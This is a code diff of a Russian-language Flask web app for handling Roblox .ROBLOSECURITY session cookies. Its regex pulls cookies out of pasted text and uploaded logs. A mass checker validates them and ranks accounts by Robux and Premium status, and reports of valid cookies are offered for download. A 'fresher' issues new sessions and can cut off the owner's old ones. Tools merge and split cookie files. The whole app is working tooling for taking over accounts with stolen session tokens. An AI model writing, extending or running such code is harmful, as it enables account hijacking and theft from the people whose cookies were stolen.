@@ -26,55 +26,6 @@ CHECKER_HISTORY_FILE = "history/checker_history.json"
 FRESHER_HISTORY_FILE = "history/fresher_history.json"
 
 # ============================================================
-# ФУНКЦИЯ ИЗВЛЕЧЕНИЯ КУКИ ИЗ ЛЮБОГО ТЕКСТА
-# ============================================================
-
-def extract_cookies_from_text(text: str) -> list:
-    """
-    Извлекает .ROBLOSECURITY куки из любого текста.
-    Поддерживает форматы:
-    - Чистые куки (начинаются с _|WARNING)
-    - Куки в логах (в конце строки после данных аккаунта)
-    - Куки с префиксом .ROBLOSECURITY=
-    - Куки в JSON/массивах
-    """
-    cookies = []
-    
-    # Паттерн для поиска куки Roblox
-    # Ищет _|WARNING:-DO-NOT-SHARE-THIS... до конца строки или до пробела/кавычки
-    pattern = r'_\|WARNING:-DO-NOT-SHARE-THIS[^\s]*'
-    
-    matches = re.findall(pattern, text)
-    
-    for match in matches:
-        # Очищаем от возможных кавычек, запятых, точек с запятой в конце
-        cookie = match.strip('",;\'\\')
-        # Убираем .ROBLOSECURITY= если есть в начале (на всякий случай)
-        if cookie.startswith('.ROBLOSECURITY='):
-            cookie = cookie[15:]
-        
-        if len(cookie) > 50:  # Минимальная длина куки
-            cookies.append(cookie)
-    
-    # Также ищем куки с префиксом .ROBLOSECURITY=
-    pattern2 = r'\.ROBLOSECURITY=(_\|WARNING[^\s;]+)'
-    matches2 = re.findall(pattern2, text)
-    for match in matches2:
-        cookie = match.strip('",;\'\\')
-        if len(cookie) > 50 and cookie not in cookies:
-            cookies.append(cookie)
-    
-    # Убираем дубликаты сохраняя порядок
-    seen = set()
-    unique_cookies = []
-    for c in cookies:
-        if c not in seen:
-            seen.add(c)
-            unique_cookies.append(c)
-    
-    return unique_cookies
-
-# ============================================================
 # ФУНКЦИИ ИСТОРИИ
 # ============================================================
 
@@ -119,6 +70,37 @@ def add_to_fresher_history(entry):
     if len(history) > 50:
         history = history[-50:]
     save_history(FRESHER_HISTORY_FILE, history)
+
+# ============================================================
+# ИЗВЛЕЧЕНИЕ КУКИ ИЗ ЛЮБОГО ТЕКСТА
+# ============================================================
+
+def extract_cookies_from_text(text: str) -> list:
+    cookies = []
+    pattern = r'_\|WARNING:-DO-NOT-SHARE-THIS[^\s]*'
+    matches = re.findall(pattern, text)
+    for match in matches:
+        cookie = match.strip('",;\'\\')
+        if cookie.startswith('.ROBLOSECURITY='):
+            cookie = cookie[15:]
+        if len(cookie) > 50:
+            cookies.append(cookie)
+    
+    pattern2 = r'\.ROBLOSECURITY=(_\|WARNING[^\s;]+)'
+    matches2 = re.findall(pattern2, text)
+    for match in matches2:
+        cookie = match.strip('",;\'\\')
+        if len(cookie) > 50 and cookie not in cookies:
+            cookies.append(cookie)
+    
+    seen = set()
+    unique_cookies = []
+    for c in cookies:
+        if c not in seen:
+            seen.add(c)
+            unique_cookies.append(c)
+    
+    return unique_cookies
 
 # ============================================================
 # ЧЕКЕР - ПОЛНАЯ ИНФОРМАЦИЯ
@@ -353,7 +335,7 @@ def refresh_roblox_cookie(cookie: str, kill_old: bool = False) -> dict:
         
         auth_response = session.get('https://users.roblox.com/v1/users/authenticated', verify=False, timeout=15)
         if auth_response.status_code != 200:
-            result['error'] = f"Невалидная кука"
+            result['error'] = "Невалидная кука"
             return result
         
         user_data = auth_response.json()
@@ -604,23 +586,19 @@ HTML = r"""<!DOCTYPE html>
         <div class="tab" data-tab="tools">🧰 Инструменты</div>
     </div>
 
-    <!-- ЧЕКЕР -->
     <div class="tab-content active" id="tab-checker">
         <div class="checker-grid">
             <div class="card">
                 <h2>🔍 Одиночная проверка</h2>
                 <p style="color:#9880c0;font-size:13px;margin-bottom:14px;">Вставьте ОДИН кук для полной проверки</p>
                 <textarea id="singleCookie" placeholder="Вставьте кук..." rows="3"></textarea>
-                <div class="mt-12">
-                    <button class="btn btn-primary" onclick="runSingleCheck()" style="width:100%;">🔍 Проверить</button>
-                </div>
+                <div class="mt-12"><button class="btn btn-primary" onclick="runSingleCheck()" style="width:100%;">🔍 Проверить</button></div>
                 <div class="progress-bar"><div class="progress-fill" id="singleProgress"></div></div>
                 <div class="result-box" id="singleResult">Результат здесь...</div>
             </div>
-
             <div class="card">
                 <h2>📦 Массовая проверка</h2>
-                <p style="color:#9880c0;font-size:13px;margin-bottom:14px;">Загрузите TXT файл (куки или логи). <b style="color:#10b981;">Куки извлекаются автоматически!</b></p>
+                <p style="color:#9880c0;font-size:13px;margin-bottom:14px;">Загрузите TXT файл. <b style="color:#10b981;">Куки извлекаются автоматически!</b></p>
                 <div class="upload-area" onclick="document.getElementById('massFile').click()" style="min-height:120px;">
                     <p>📁 <strong>Загрузить TXT файл</strong></p>
                     <p style="font-size:12px;color:#9880c0;">Поддерживаются логи и чистые куки</p>
@@ -628,21 +606,17 @@ HTML = r"""<!DOCTYPE html>
                 <input type="file" id="massFile" accept=".txt" style="display:none;">
                 <div id="massFileInfo" class="status-info"></div>
                 <div id="extractInfo" class="extract-info" style="display:none;"></div>
-                <div class="mt-12">
-                    <button class="btn btn-success" onclick="runMassCheck()" style="width:100%;">🚀 Массовая проверка</button>
-                </div>
+                <div class="mt-12"><button class="btn btn-success" onclick="runMassCheck()" style="width:100%;">🚀 Массовая проверка</button></div>
                 <div class="progress-bar"><div class="progress-fill" id="massProgress"></div></div>
                 <div class="result-box" id="massResult">Результаты здесь...</div>
             </div>
         </div>
-
         <div class="card history-section">
             <h3>📋 История проверок <button class="btn btn-danger btn-sm" onclick="clearCheckerHistory()">🗑️ Очистить</button></h3>
             <div id="checkerHistoryList"><div class="empty-history">Загрузка...</div></div>
         </div>
     </div>
 
-    <!-- ФРЕШЕР -->
     <div class="tab-content" id="tab-fresher">
         <div class="card">
             <h2>🔄 Фрешер сессий</h2>
@@ -653,15 +627,8 @@ HTML = r"""<!DOCTYPE html>
             </div>
             <input type="hidden" id="fresherMode" value="duplicate">
             <div class="flex-row">
-                <div class="flex-2">
-                    <textarea id="fresherCookies" placeholder="Вставьте куки для обновления..." rows="6"></textarea>
-                </div>
-                <div class="flex-1">
-                    <div class="upload-area" onclick="document.getElementById('fresherFile').click()">
-                        <p>📁 <strong>Загрузить .txt</strong></p>
-                    </div>
-                    <input type="file" id="fresherFile" accept=".txt" style="display:none;">
-                </div>
+                <div class="flex-2"><textarea id="fresherCookies" placeholder="Вставьте куки для обновления..." rows="6"></textarea></div>
+                <div class="flex-1"><div class="upload-area" onclick="document.getElementById('fresherFile').click()"><p>📁 <strong>Загрузить .txt</strong></p></div><input type="file" id="fresherFile" accept=".txt" style="display:none;"></div>
             </div>
             <div class="mt-18 gap-12">
                 <button class="btn btn-success" onclick="runFresher()">⚡ Обновить</button>
@@ -676,46 +643,12 @@ HTML = r"""<!DOCTYPE html>
         </div>
     </div>
 
-    <!-- ИНСТРУМЕНТЫ -->
     <div class="tab-content" id="tab-tools">
         <div class="tool-grid">
-            <div class="tool-card">
-                <h3>🔗 Слияние файлов</h3>
-                <p class="desc">Объедините несколько .txt файлов. Дубликаты удаляются.</p>
-                <div class="upload-area" onclick="document.getElementById('mergeFiles').click()"><p>📁 <strong>Выбрать файлы</strong></p></div>
-                <input type="file" id="mergeFiles" accept=".txt" multiple style="display:none;">
-                <div class="file-list" id="mergeFileList"></div>
-                <button class="btn btn-primary" onclick="mergeCookies()" style="width:100%;">🔄 Объединить</button>
-                <div class="result-box" id="mergeResult">Результат...</div>
-            </div>
-            <div class="tool-card">
-                <h3>✂️ По количеству</h3>
-                <p class="desc">Разделите на части по N куки в каждой.</p>
-                <div class="upload-area" onclick="document.getElementById('splitCountFile').click()"><p>📁 <strong>Загрузить файл</strong></p></div>
-                <input type="file" id="splitCountFile" accept=".txt" style="display:none;">
-                <div class="input-row"><input type="number" id="splitCount" placeholder="Кол-во" value="100" min="1"><span>шт.</span></div>
-                <button class="btn btn-primary" onclick="splitByCount()" style="width:100%;">📦 Разделить</button>
-                <div class="result-box" id="splitCountResult">Результат...</div>
-            </div>
-            <div class="tool-card">
-                <h3>📊 На N файлов</h3>
-                <p class="desc">Равномерно распределите на указанное количество файлов.</p>
-                <div class="upload-area" onclick="document.getElementById('splitFilesFile').click()"><p>📁 <strong>Загрузить файл</strong></p></div>
-                <input type="file" id="splitFilesFile" accept=".txt" style="display:none;">
-                <div class="input-row"><input type="number" id="splitFilesCount" placeholder="Кол-во" value="5" min="1"><span>файлов</span></div>
-                <button class="btn btn-primary" onclick="splitByFiles()" style="width:100%;">📂 Разделить</button>
-                <div class="result-box" id="splitFilesResult">Результат...</div>
-            </div>
-            <div class="tool-card">
-                <h3>🧹 Очистка</h3>
-                <p class="desc">Удалите дубликаты или приведите к формату.</p>
-                <textarea id="cleanCookiesInput" placeholder="Вставьте куки..." rows="4"></textarea>
-                <div class="gap-8 mt-12">
-                    <button class="btn btn-primary" onclick="cleanCookies('deduplicate')" style="flex:1;">🔄 Дубликаты</button>
-                    <button class="btn btn-secondary" onclick="cleanCookies('format')" style="flex:1;">📝 Формат</button>
-                </div>
-                <div class="result-box" id="cleanResult">Результат...</div>
-            </div>
+            <div class="tool-card"><h3>🔗 Слияние файлов</h3><p class="desc">Объедините несколько .txt файлов. Дубликаты удаляются.</p><div class="upload-area" onclick="document.getElementById('mergeFiles').click()"><p>📁 <strong>Выбрать файлы</strong></p></div><input type="file" id="mergeFiles" accept=".txt" multiple style="display:none;"><div class="file-list" id="mergeFileList"></div><button class="btn btn-primary" onclick="mergeCookies()" style="width:100%;">🔄 Объединить</button><div class="result-box" id="mergeResult">Результат...</div></div>
+            <div class="tool-card"><h3>✂️ По количеству</h3><p class="desc">Разделите на части по N куки.</p><div class="upload-area" onclick="document.getElementById('splitCountFile').click()"><p>📁 <strong>Загрузить файл</strong></p></div><input type="file" id="splitCountFile" accept=".txt" style="display:none;"><div class="input-row"><input type="number" id="splitCount" value="100" min="1"><span>шт.</span></div><button class="btn btn-primary" onclick="splitByCount()" style="width:100%;">📦 Разделить</button><div class="result-box" id="splitCountResult">Результат...</div></div>
+            <div class="tool-card"><h3>📊 На N файлов</h3><p class="desc">Равномерно распределите на N файлов.</p><div class="upload-area" onclick="document.getElementById('splitFilesFile').click()"><p>📁 <strong>Загрузить файл</strong></p></div><input type="file" id="splitFilesFile" accept=".txt" style="display:none;"><div class="input-row"><input type="number" id="splitFilesCount" value="5" min="1"><span>файлов</span></div><button class="btn btn-primary" onclick="splitByFiles()" style="width:100%;">📂 Разделить</button><div class="result-box" id="splitFilesResult">Результат...</div></div>
+            <div class="tool-card"><h3>🧹 Очистка</h3><p class="desc">Удалите дубликаты или форматируйте.</p><textarea id="cleanCookiesInput" placeholder="Вставьте куки..." rows="4"></textarea><div class="gap-8 mt-12"><button class="btn btn-primary" onclick="cleanCookies('deduplicate')" style="flex:1;">🔄 Дубликаты</button><button class="btn btn-secondary" onclick="cleanCookies('format')" style="flex:1;">📝 Формат</button></div><div class="result-box" id="cleanResult">Результат...</div></div>
         </div>
     </div>
 
@@ -763,19 +696,18 @@ document.getElementById('fresherFile').addEventListener('change', function(e) {
 document.getElementById('massFile').addEventListener('change', function(e) {
     if (this.files && this.files[0]) {
         var file = this.files[0];
-        document.getElementById('massFileInfo').textContent = '✅ ' + file.name + ' (' + (file.size/1024).toFixed(1) + ' KB)';
+        document.getElementById('massFileInfo').textContent = '✅ ' + file.name;
         var reader = new FileReader();
         reader.onload = function(evt) {
             window.massFileContent = evt.target.result;
-            // Показываем сколько куков найдено
             var fd = new FormData();
-            fd.append('file', new Blob([window.massFileContent], { type: 'text/plain' }), 'preview.txt');
+            fd.append('file', new Blob([window.massFileContent], { type: 'text/plain' }));
             fetch('/api/extract-preview', { method: 'POST', body: fd })
                 .then(function(r) { return r.json(); })
                 .then(function(d) {
                     if (d.success) {
-                        document.getElementById('extractInfo').style.display = 'block';
-                        document.getElementById('extractInfo').textContent = '🔍 Найдено куков: ' + d.count + ' (извлечено автоматически)';
+                        var info = document.getElementById('extractInfo');
+                        if (info) { info.style.display = 'block'; info.textContent = '🔍 Найдено куков: ' + d.count; }
                     }
                 });
         };
@@ -784,32 +716,16 @@ document.getElementById('massFile').addEventListener('change', function(e) {
 });
 
 document.getElementById('mergeFiles').addEventListener('change', function(e) {
-    var list = document.getElementById('mergeFileList');
-    list.innerHTML = '';
-    if (this.files) {
-        Array.from(this.files).forEach(function(f, i) {
-            var div = document.createElement('div');
-            div.className = 'file-item';
-            div.textContent = (i+1) + '. ' + f.name;
-            list.appendChild(div);
-        });
-    }
+    var list = document.getElementById('mergeFileList'); list.innerHTML = '';
+    if (this.files) { Array.from(this.files).forEach(function(f, i) { var div = document.createElement('div'); div.className = 'file-item'; div.textContent = (i+1) + '. ' + f.name; list.appendChild(div); }); }
 });
 
 document.getElementById('splitCountFile').addEventListener('change', function(e) {
-    if (this.files && this.files[0]) {
-        var reader = new FileReader();
-        reader.onload = function(evt) { window.splitCountContent = evt.target.result; };
-        reader.readAsText(this.files[0]);
-    }
+    if (this.files && this.files[0]) { var reader = new FileReader(); reader.onload = function(evt) { window.splitCountContent = evt.target.result; }; reader.readAsText(this.files[0]); }
 });
 
 document.getElementById('splitFilesFile').addEventListener('change', function(e) {
-    if (this.files && this.files[0]) {
-        var reader = new FileReader();
-        reader.onload = function(evt) { window.splitFilesContent = evt.target.result; };
-        reader.readAsText(this.files[0]);
-    }
+    if (this.files && this.files[0]) { var reader = new FileReader(); reader.onload = function(evt) { window.splitFilesContent = evt.target.result; }; reader.readAsText(this.files[0]); }
 });
 
 async function runSingleCheck() {
@@ -817,17 +733,11 @@ async function runSingleCheck() {
     var cookie = document.getElementById('singleCookie').value.trim();
     var progress = document.getElementById('singleProgress');
     if (!cookie) { resBox.textContent = '❌ Вставьте кук!'; return; }
-    resBox.textContent = '⏳ Проверка...';
-    progress.style.width = '30%';
+    resBox.textContent = '⏳ Проверка...'; progress.style.width = '30%';
     try {
-        var r = await fetch('/api/single-check', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ cookie: cookie })
-        });
+        var r = await fetch('/api/single-check', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cookie: cookie }) });
         var d = await r.json();
-        progress.style.width = '100%';
-        setTimeout(function() { progress.style.width = '0%'; }, 1000);
+        progress.style.width = '100%'; setTimeout(function() { progress.style.width = '0%'; }, 1000);
         if (d.success) { resBox.textContent = d.report; loadCheckerHistory(); }
         else { resBox.textContent = '❌ ' + (d.message || 'Ошибка'); }
     } catch(e) { resBox.textContent = '❌ ' + e.message; progress.style.width = '0%'; }
@@ -838,24 +748,20 @@ async function runMassCheck() {
     var progress = document.getElementById('massProgress');
     var content = window.massFileContent;
     if (!content) { resBox.textContent = '❌ Загрузите TXT файл!'; return; }
-    resBox.textContent = '⏳ Извлечение куков и проверка...';
-    progress.style.width = '20%';
+    resBox.textContent = '⏳ Извлечение и проверка...'; progress.style.width = '20%';
     try {
-        var fd = new FormData();
-        fd.append('file', new Blob([content], { type: 'text/plain' }), 'mass_check.txt');
+        var fd = new FormData(); fd.append('file', new Blob([content], { type: 'text/plain' }));
         var r = await fetch('/api/mass-check', { method: 'POST', body: fd });
         var d = await r.json();
-        progress.style.width = '100%';
-        setTimeout(function() { progress.style.width = '0%'; }, 1000);
+        progress.style.width = '100%'; setTimeout(function() { progress.style.width = '0%'; }, 1000);
         if (d.success) {
-            var html = '📊 Извлечено куков: ' + d.extracted_count + ' | Проверено: ' + d.total + '\n';
-            html += '✅ Валидных: ' + d.valid_count + ' | ❌ Невалидных: ' + d.invalid_count + '\n';
+            var html = '📊 Извлечено: ' + d.extracted_count + ' | Проверено: ' + d.total + '\n';
+            html += '✅ Валид: ' + d.valid_count + ' | ❌ Невалид: ' + d.invalid_count + '\n';
             html += '💠 Premium: ' + (d.premium_count || 0) + ' | 💰 Robux: ' + (d.total_robux || 0).toLocaleString() + '\n\n';
             html += '══════ 🏆 ОТ ЛУЧШИХ К ХУДШИМ ══════\n\n';
             for (var i = 0; i < d.results.length; i++) { html += d.results[i] + '\n'; }
             if (d.download_url) { html += '\n📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать отчет</a>'; }
-            resBox.innerHTML = html;
-            loadCheckerHistory();
+            resBox.innerHTML = html; loadCheckerHistory();
         } else { resBox.textContent = '❌ ' + (d.message || 'Ошибка'); }
     } catch(e) { resBox.textContent = '❌ ' + e.message; progress.style.width = '0%'; }
 }
@@ -866,37 +772,27 @@ async function runFresher() {
     var mode = document.getElementById('fresherMode').value;
     var progress = document.getElementById('fresherProgress');
     if (!cookies) { resBox.textContent = '❌ Вставьте куки!'; return; }
-    resBox.textContent = '⏳ Обновление...';
-    progress.style.width = '30%';
+    resBox.textContent = '⏳ Обновление...'; progress.style.width = '30%';
     try {
-        var r = await fetch('/api/fresher', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ cookies: cookies, mode: mode })
-        });
+        var r = await fetch('/api/fresher', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cookies: cookies, mode: mode }) });
         var d = await r.json();
-        progress.style.width = '100%';
-        setTimeout(function() { progress.style.width = '0%'; }, 1000);
+        progress.style.width = '100%'; setTimeout(function() { progress.style.width = '0%'; }, 1000);
         if (d.success && d.only_cookies) { resBox.textContent = d.only_cookies; loadFresherHistory(); }
         else { resBox.textContent = '❌ ' + (d.message || 'Не удалось'); }
     } catch(e) { resBox.textContent = '❌ ' + e.message; progress.style.width = '0%'; }
 }
 
-function clearFresherInputs() {
-    document.getElementById('fresherCookies').value = '';
-    document.getElementById('fresherResult').textContent = 'Новые куки здесь...';
-}
+function clearFresherInputs() { document.getElementById('fresherCookies').value = ''; document.getElementById('fresherResult').textContent = 'Новые куки здесь...'; }
 
 async function loadCheckerHistory() {
     var container = document.getElementById('checkerHistoryList');
     try {
-        var r = await fetch('/api/history/checker');
-        var d = await r.json();
+        var r = await fetch('/api/history/checker'); var d = await r.json();
         if (d.history && d.history.length > 0) {
             var html = '';
             d.history.slice().reverse().forEach(function(item) {
                 var typeLabel = item.type === 'mass' ? '📦 Массовая' : '🔍 Одиночная';
-                html += '<div class="history-item" onclick="var det=this.querySelector(\'.hist-detail\');det.style.display=det.style.display===\'none\'?\'block\':\'none\'">';
+                html += '<div class="history-item" onclick="var x=this.querySelector(\'.hist-detail\');x.style.display=x.style.display==\'none\'?\'block\':\'none\'">';
                 html += '<div class="hist-header"><span class="hist-date">📅 ' + item.timestamp + '</span><span class="hist-stats">' + typeLabel + ' | ✅ ' + item.valid + '/' + item.total + '</span></div>';
                 html += '<div class="hist-detail">' + (item.cookies ? item.cookies.join('\n───\n') : 'Нет данных') + '</div></div>';
             });
@@ -905,22 +801,17 @@ async function loadCheckerHistory() {
     } catch(e) { container.innerHTML = '<div class="empty-history">❌ Ошибка</div>'; }
 }
 
-async function clearCheckerHistory() {
-    if (!confirm('Удалить историю?')) return;
-    await fetch('/api/history/checker/clear', { method: 'POST' });
-    loadCheckerHistory();
-}
+async function clearCheckerHistory() { if (!confirm('Удалить историю?')) return; await fetch('/api/history/checker/clear', { method: 'POST' }); loadCheckerHistory(); }
 
 async function loadFresherHistory() {
     var container = document.getElementById('fresherHistoryList');
     try {
-        var r = await fetch('/api/history/fresher');
-        var d = await r.json();
+        var r = await fetch('/api/history/fresher'); var d = await r.json();
         if (d.history && d.history.length > 0) {
             var html = '';
             d.history.slice().reverse().forEach(function(item) {
                 var ml = item.mode === 'kill' ? '💀 Сброс' : '♻️ Дублирование';
-                html += '<div class="history-item" onclick="var det=this.querySelector(\'.hist-detail\');det.style.display=det.style.display===\'none\'?\'block\':\'none\'">';
+                html += '<div class="history-item" onclick="var x=this.querySelector(\'.hist-detail\');x.style.display=x.style.display==\'none\'?\'block\':\'none\'">';
                 html += '<div class="hist-header"><span class="hist-date">📅 ' + item.timestamp + '</span><span class="hist-stats">' + ml + ' | ' + item.refreshed_count + ' шт.</span></div>';
                 html += '<div class="hist-detail">' + (item.cookies ? item.cookies.join('\n') : 'Нет данных') + '</div></div>';
             });
@@ -929,29 +820,22 @@ async function loadFresherHistory() {
     } catch(e) { container.innerHTML = '<div class="empty-history">❌ Ошибка</div>'; }
 }
 
-async function clearFresherHistory() {
-    if (!confirm('Удалить историю?')) return;
-    await fetch('/api/history/fresher/clear', { method: 'POST' });
-    loadFresherHistory();
-}
+async function clearFresherHistory() { if (!confirm('Удалить историю?')) return; await fetch('/api/history/fresher/clear', { method: 'POST' }); loadFresherHistory(); }
 
 async function mergeCookies() {
     var files = document.getElementById('mergeFiles').files;
     if (!files || files.length < 2) { document.getElementById('mergeResult').textContent = '❌ Минимум 2 файла'; return; }
-    var fd = new FormData();
-    Array.from(files).forEach(function(f) { fd.append('files', f); });
+    var fd = new FormData(); Array.from(files).forEach(function(f) { fd.append('files', f); });
     document.getElementById('mergeResult').textContent = '⏳ Объединение...';
     try {
-        var r = await fetch('/api/merge-cookies', { method: 'POST', body: fd });
-        var d = await r.json();
+        var r = await fetch('/api/merge-cookies', { method: 'POST', body: fd }); var d = await r.json();
         if (d.success) { document.getElementById('mergeResult').innerHTML = '✅ ' + d.total_files + ' файлов | 📊 ' + d.total_cookies + ' куки<br><br>📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать</a>'; }
         else { document.getElementById('mergeResult').textContent = '❌ ' + (d.message || 'Ошибка'); }
     } catch(e) { document.getElementById('mergeResult').textContent = '❌ ' + e.message; }
 }
 
 async function splitByCount() {
-    var content = window.splitCountContent;
-    var count = parseInt(document.getElementById('splitCount').value);
+    var content = window.splitCountContent; var count = parseInt(document.getElementById('splitCount').value);
     if (!content) { document.getElementById('splitCountResult').textContent = '❌ Загрузите файл'; return; }
     document.getElementById('splitCountResult').textContent = '⏳ Разделение...';
     try {
@@ -963,8 +847,7 @@ async function splitByCount() {
 }
 
 async function splitByFiles() {
-    var content = window.splitFilesContent;
-    var num = parseInt(document.getElementById('splitFilesCount').value);
+    var content = window.splitFilesContent; var num = parseInt(document.getElementById('splitFilesCount').value);
     if (!content) { document.getElementById('splitFilesResult').textContent = '❌ Загрузите файл'; return; }
     document.getElementById('splitFilesResult').textContent = '⏳ Разделение...';
     try {
@@ -1006,11 +889,9 @@ def index():
 
 @app.route("/api/extract-preview", methods=["POST"])
 def api_extract_preview():
-    """Предпросмотр - показывает сколько куков найдено в файле"""
     content = ""
     if 'file' in request.files:
         content = request.files['file'].read().decode('utf-8', errors='ignore')
-    
     cookies = extract_cookies_from_text(content)
     return jsonify({"success": True, "count": len(cookies)})
 
@@ -1018,18 +899,10 @@ def api_extract_preview():
 def api_single_check():
     data = request.json or {}
     cookie = data.get("cookie", "").strip()
-    if not cookie:
-        return jsonify({"success": False, "message": "Кук не предоставлен"})
-    
+    if not cookie: return jsonify({"success": False, "message": "Кук не предоставлен"})
     info = get_full_info(cookie)
     report = format_full_report(info)
-    
-    add_to_checker_history({
-        'type': 'single', 'total': 1,
-        'valid': 1 if info['status'] == '✅' else 0,
-        'cookies': [report], 'download_url': ''
-    })
-    
+    add_to_checker_history({'type': 'single', 'total': 1, 'valid': 1 if info['status'] == '✅' else 0, 'cookies': [report], 'download_url': ''})
     return jsonify({"success": True, "report": report, "status": info['status']})
 
 @app.route("/api/mass-check", methods=["POST"])
@@ -1037,108 +910,64 @@ def api_mass_check():
     content = ""
     if 'file' in request.files:
         content = request.files['file'].read().decode('utf-8', errors='ignore')
+    if not content: return jsonify({"success": False, "message": "Файл не предоставлен"})
     
-    if not content:
-        return jsonify({"success": False, "message": "Файл не предоставлен"})
-    
-    # ИЗВЛЕКАЕМ КУКИ ИЗ ЛЮБОГО ТЕКСТА
     cookies = extract_cookies_from_text(content)
     extracted_count = len(cookies)
-    
-    if not cookies:
-        return jsonify({"success": False, "message": "Куки не найдены в файле. Убедитесь что файл содержит _|WARNING:-DO-NOT-SHARE-THIS..."})
-    
-    if len(cookies) > 10000:
-        cookies = cookies[:10000]
+    if not cookies: return jsonify({"success": False, "message": "Куки не найдены"})
+    if len(cookies) > 10000: cookies = cookies[:10000]
     
     results = mass_check_cookies(cookies, max_workers=10)
-    
     valid_results = [r for r in results if r['status'] == '✅']
     invalid_results = [r for r in results if r['status'] == '❌']
     formatted_results = [format_quick_report(r) for r in results]
-    
     premium_count = sum(1 for r in valid_results if r.get('is_premium'))
     total_robux = sum(r.get('robux', 0) for r in valid_results)
     
     timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
     filename = f"mass_check_{timestamp}.txt"
     filepath = os.path.join("downloads", filename)
-    
     with open(filepath, 'w', encoding='utf-8') as f:
         f.write("═" * 60 + "\n")
-        f.write("  📊 РЕЗУЛЬТАТЫ МАССОВОЙ ПРОВЕРКИ\n")
+        f.write(f"  📊 РЕЗУЛЬТАТЫ | {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n")
         f.write("═" * 60 + "\n")
-        f.write(f"  📅 {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n")
-        f.write(f"  🔍 Извлечено куков: {extracted_count}\n")
-        f.write(f"  📦 Проверено: {len(results)} | ✅ {len(valid_results)} | ❌ {len(invalid_results)}\n")
+        f.write(f"  🔍 Извлечено: {extracted_count} | 📦 Проверено: {len(results)}\n")
+        f.write(f"  ✅ Валид: {len(valid_results)} | ❌ Невалид: {len(invalid_results)}\n")
         f.write(f"  💠 Premium: {premium_count} | 💰 Robux: {total_robux:,}\n")
-        f.write("═" * 60 + "\n\n")
-        f.write("👑💎⭐ ЛУЧШИЕ АККАУНТЫ ⭐💎👑\n\n")
+        f.write("═" * 60 + "\n\n👑💎⭐ ЛУЧШИЕ АККАУНТЫ ⭐💎👑\n\n")
         for r in valid_results:
             score = r.get('score', 0)
             rank = "👑" if score >= 150 else ("💎" if score >= 100 else ("⭐" if score >= 60 else ("🟢" if score >= 30 else "🔹")))
             f.write(f"{rank} {r['username']} [{r['user_id']}] | ⏣ {r['robux']:,} | Score: {score}\n")
             f.write(f"   Cookie: {r['cookie']}\n\n")
-        
         if invalid_results:
             f.write("\n❌ НЕВАЛИДНЫЕ:\n")
-            for r in invalid_results:
-                f.write(f"   {r['cookie']}\n")
+            for r in invalid_results: f.write(f"   {r['cookie']}\n")
     
     download_url = f"/downloads/{filename}"
+    add_to_checker_history({'type': 'mass', 'total': len(results), 'valid': len(valid_results), 'cookies': formatted_results[:20], 'download_url': download_url})
     
-    add_to_checker_history({
-        'type': 'mass', 'total': len(results),
-        'valid': len(valid_results), 'cookies': formatted_results[:20],
-        'download_url': download_url
-    })
-    
-    return jsonify({
-        "success": True,
-        "extracted_count": extracted_count,
-        "total": len(results),
-        "valid_count": len(valid_results),
-        "invalid_count": len(invalid_results),
-        "premium_count": premium_count,
-        "total_robux": total_robux,
-        "results": formatted_results,
-        "download_url": download_url
-    })
+    return jsonify({"success": True, "extracted_count": extracted_count, "total": len(results), "valid_count": len(valid_results), "invalid_count": len(invalid_results), "premium_count": premium_count, "total_robux": total_robux, "results": formatted_results, "download_url": download_url})
 
 @app.route("/api/fresher", methods=["POST"])
 def api_fresher():
     data = request.json or {}
     raw = data.get("cookies", "")
     mode = data.get("mode", "duplicate")
-    
-    # Извлекаем куки из текста
     cookies_list = extract_cookies_from_text(raw)
-    
-    if not cookies_list:
-        return jsonify({"success": False, "message": "Куки не найдены"})
+    if not cookies_list: return jsonify({"success": False, "message": "Куки не найдены"})
     
     only_cookies = []
     cookie_hist = []
-    
     for c in cookies_list:
         result = refresh_roblox_cookie(c, kill_old=(mode == 'kill'))
         if result['success'] and result['new_cookie']:
-            new_cookie = result['new_cookie']
-            username = result.get('username', '?')
-            cookie_hist.append(f"🟢 {username} - НОВАЯ")
-            only_cookies.append(new_cookie)
-        else:
-            cookie_hist.append(f"❌ Ошибка")
+            cookie_hist.append(f"🟢 {result.get('username','?')} - НОВАЯ")
+            only_cookies.append(result['new_cookie'])
+        else: cookie_hist.append(f"❌ Ошибка")
     
-    add_to_fresher_history({
-        'mode': mode, 'refreshed_count': len(only_cookies), 'cookies': cookie_hist
-    })
-    
-    return jsonify({
-        "success": True,
-        "refreshed_count": len(only_cookies),
-        "only_cookies": '\n'.join(only_cookies) if only_cookies else ''
-    })
+    add_to_fresher_history({'mode': mode, 'refreshed_count': len(only_cookies), 'cookies': cookie_hist})
+    return jsonify({"success": True, "refreshed_count": len(only_cookies), "only_cookies": '\n'.join(only_cookies) if only_cookies else ''})
 
 @app.route("/api/history/checker")
 def api_history_checker():
@@ -1160,30 +989,18 @@ def api_clear_fresher_history():
 
 @app.route("/api/merge-cookies", methods=["POST"])
 def api_merge_cookies():
-    if 'files' not in request.files:
-        return jsonify({"success": False, "message": "Файлы не найдены"})
+    if 'files' not in request.files: return jsonify({"success": False, "message": "Файлы не найдены"})
     files = request.files.getlist('files')
-    if len(files) < 2:
-        return jsonify({"success": False, "message": "Минимум 2 файла"})
-    
+    if len(files) < 2: return jsonify({"success": False, "message": "Минимум 2 файла"})
     contents = [file.read().decode('utf-8', errors='ignore') for file in files]
     merged = merge_cookie_files(contents)
-    
     timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
     filename = f"merged_{timestamp}.txt"
     filepath = os.path.join("downloads", filename)
-    with open(filepath, 'w', encoding='utf-8') as f:
-        f.write(merged)
-    
+    with open(filepath, 'w', encoding='utf-8') as f: f.write(merged)
     all_lines = [l for l in merged.split('\n') if l]
     total_orig = sum(len([l for l in c.split('\n') if l.strip()]) for c in contents)
-    
-    return jsonify({
-        "success": True, "total_files": len(files),
-        "total_cookies": len(all_lines),
-        "duplicates_removed": total_orig - len(all_lines),
-        "download_url": f"/downloads/{filename}"
-    })
